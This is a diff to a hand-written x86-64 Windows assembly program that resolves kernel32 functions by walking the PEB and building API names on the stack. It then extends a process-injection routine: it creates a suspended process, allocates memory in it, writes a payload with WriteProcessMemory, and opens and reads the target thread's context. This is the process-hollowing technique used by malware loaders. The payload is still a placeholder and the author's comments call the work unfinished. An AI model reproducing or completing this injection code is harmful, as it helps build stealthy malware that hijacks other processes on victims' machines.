@@ -11,7 +11,7 @@ global main
 
 section .text
 main:
-	sub rsp, 0x308			;not sure why I have to add 0x28. Seems counter-intuitive as the stack should be 0x10 aligned.
+	sub rsp, 0x508			;not sure why I have to add 0x28. Seems counter-intuitive as the stack should be 0x10 aligned.
 	
 	;Get the PEB at gs:[0x60]
 	mov rax, gs:[0x60]		;PEB location.
@@ -22,7 +22,7 @@ main:
 	;Get the inMemoryOrderModuleList structure.
 	mov qword r12, [rbx + 0x20]
 
-	;Looking for kernel32 base.
+;Looking for kernel32 base.
 	mov qword rax, [r12]
 	mov qword rax, [rax]
 	mov qword r14, [rax + 0x20]
@@ -94,20 +94,9 @@ main:
 	;R14 == Image Base of kernel32.
 	;R15 == Export Address Table (EAT).
 
-	;Initializing the counter.
+	;Initializing the counter and initiating function search.
 	xor rdx, rdx
-	
-	;Initializing the CreateProcess string to find it in the export table for kernel32.
-	mov eax, 0x61657243 
-	mov [rsp + 0x100], rax
-	mov eax, 0x72506574 
-	mov [rsp + 0x104], rax
-	mov eax, 0x7365636f 
-	mov [rsp + 0x108], rax
-	mov eax, 0x00004173
-	mov [rsp + 0x10c], rax
-	xor rax, rax
-	jmp keepCount
+	jmp FindCrtP
 
 	;Count the size of the string.
 keepCount:
@@ -168,6 +157,9 @@ contn:
 	mov rax, [rsp + 0x188]
 	test rax, rax
 	jz initRT
+	mov rax, [rsp + 0x190]
+	test rax, rax
+	jz initOT
 
 initProcA:
 	mov qword rax, rsi
@@ -213,10 +205,40 @@ initRT:
 	xor rdx, rdx
 	mov qword rax, rsi
 	mov [rsp + 0x188], rax			;ResumeThread on the stack via pointer.
+	jmp FindOT
+
+initOT:
+	xor rdx, rdx
+	mov qword rax, rsi
+	mov [rsp + 0x190], rax			;OpenThread on the stack via pointer.
 	jmp CrtPrc
 
+FindCrtP:
+	mov eax, 0x61657243 
+	mov [rsp + 0x100], rax
+	mov eax, 0x72506574 
+	mov [rsp + 0x104], rax
+	mov eax, 0x7365636f 
+	mov [rsp + 0x108], rax
+	mov eax, 0x00004173
+	mov [rsp + 0x10c], rax
+	xor rax, rax
+	jmp keepCount
 
-	;Now find GetStartupInfoW.
+FindSI:
+	mov eax, 0x53746547 
+	mov [rsp + 0x100], rax
+	mov eax, 0x74726174 
+	mov [rsp + 0x104], rax
+	mov eax, 0x6e497075 
+	mov [rsp + 0x108], rax
+	mov eax, 0x00576f66
+	mov [rsp + 0x10c], rax
+	xor rax, rax
+	jmp keepCount
+
+
+	;Call GetStartupinfoW.
 	;Set up the STARTUPINFOA Struct.
 	;------------------------------------
 	;typedef struct _STARTUPINFOA {
@@ -243,20 +265,6 @@ initRT:
 	;VOID GetStartupInfoW(
 	;  [out] LPSTARTUPINFOW lpStartupInfo
 	;);
-
-FindSI:
-	mov eax, 0x53746547 
-	mov [rsp + 0x100], rax
-	mov eax, 0x74726174 
-	mov [rsp + 0x104], rax
-	mov eax, 0x6e497075 
-	mov [rsp + 0x108], rax
-	mov eax, 0x00576f66
-	mov [rsp + 0x10c], rax
-	xor rax, rax
-	jmp keepCount
-
-	;Call GetStartupinfoW.
 callSI:
 	lea qword rcx, [rsp + 0x200]
 	mov rax, [rsp + 0x158]
@@ -338,7 +346,15 @@ FindRT:
 	xor rax, rax
 	jmp keepCount
 
-
+FindOT:
+	mov eax, 0x6e65704f 
+	mov [rsp + 0x100], rax
+	mov eax, 0x65726854 
+	mov [rsp + 0x104], rax
+	mov eax, 0x00006461
+	mov [rsp + 0x108], rax
+	xor rax, rax
+	jmp keepCount
 
 
 	;Call CreateProcess WinAPI with arguments.
@@ -406,6 +422,7 @@ CrtPrc:
 	;[rsp + 0x178]			GetThreadContext on the stack via pointer.
 	;[rsp + 0x180]			SetThreadContext on the stack via pointer.
 	;[rsp + 0x188]			ResumeThread on the stack via pointer.
+	;[rsp + 0x190]			OpenThread on the stack via pointer.
 	;[rsp + 0x26c]			PROCESS_INFORMATION struct for suspended process.
 
 	;LPVOID VirtualAllocEx(
@@ -425,6 +442,59 @@ CrtPrc:
 	lea qword rax, [rsp + 0x168]
 	mov rax, [rax]
 	call rax
+	mov [rsp + 0x2f8], rax
+
+
+	;Call WriteProcessMemory to move payload to target.
+	;------------------------------------
+	;BOOL WriteProcessMemory(
+	;  [in]  HANDLE  hProcess,
+	;  [in]  LPVOID  lpBaseAddress,
+	;  [in]  LPCVOID lpBuffer,
+	;  [in]  SIZE_T  nSize,
+	;  [out] SIZE_T  *lpNumberOfBytesWritten
+	;);
+	;######### MAY NEED TO GET HEAP FOR PAYLOAD! ABI GIVING ME BULLSHIT WITH TOOMUCH STACK!!!#####
+	lea qword rax, [rsp + 0x26c]
+	mov qword rcx, [rax]
+	mov qword rax, [rsp + 0x2f8]
+	mov rdx, rax
+	mov qword [rsp + 0x2f0], 0x41414141	;MAY NEED TO USE HEAP INSTEAD OF STACK!!!!
+	lea qword r8, [rsp + 0x2f0]
+CountPL:
+	mov r9, 0x08					;seperate instruction for counting the payload length. Do this!
+	lea qword rax, [rsp + 0x300]
+	mov qword [rsp + 0x20], rax
+	mov qword rax, [rsp + 0x170]
+	call rax
+
+
+	;Change thread context w/ OpenThread to call GetThreadContext later w/o errors.
+	;------------------------------------
+	;HANDLE OpenThread(
+	;  [in] DWORD dwDesiredAccess,
+	;  [in] BOOL  bInheritHandle,
+	;  [in] DWORD dwThreadId
+	;);
+	mov qword rcx, 0x000f01ff
+	xor rdx, rdx
+	lea qword rax, [rsp + 0x26c]
+	mov qword r8, [rax + 0x14]
+	mov qword rax, [rsp + 0x190]
+	call rax
+
+
+	;Get the thread context via GetThreadContext.
+	;------------------------------------
+	;BOOL GetThreadContext(
+	;  [in]      HANDLE    hThread,
+	;  [in, out] LPCONTEXT lpContext
+	;);
+	mov qword rcx, rax
+	lea qword rdx, [rsp + 0x400]		;MAY NEED HEAP FOR THIS; TOOMUCH STACK == BULLSHIT!
+	mov qword rax, [rsp + 0x178]
+	call rax
+
 
 endit:
 	;Exit process
